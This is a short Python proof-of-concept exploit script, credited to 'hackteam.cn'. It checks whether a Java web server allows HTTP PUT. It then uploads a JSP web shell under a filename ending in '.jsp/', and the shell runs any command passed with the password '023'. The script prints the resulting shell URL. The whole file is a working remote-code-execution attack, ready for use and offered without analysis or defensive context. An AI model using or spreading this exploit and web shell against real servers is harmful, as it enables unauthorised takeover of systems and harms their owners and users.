# -*- coding: utf-8 -*-
#author:hackteam.cn
import random
import requests
import sys


def exploit(url):
    res=''
    body = '''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
    +"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'''
    filecontent="""<%out.println("shajiba");}%>"""
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2'}
    AllowMethod= requests.options(url,timeout=10,verify=False).headers
    if 'PUT' in AllowMethod['Allow']:
        filename="test"+str(random.randint(666, 666666))+".jsp/"
        url=url+filename
        putstatus=requests.put(url,headers=headers,data=body,timeout=10,verify=False)
        if putstatus.status_code==201:
            res= url[0:-1]#?pwd=023&cmd=id
    return res

if len(sys.argv) < 2:
    print("python poc.py http://192.168.1.10:8080/")
    sys.exit(1)
else:
    TARGET=sys.argv[1]
    print 'get shell at-->'+exploit(TARGET)
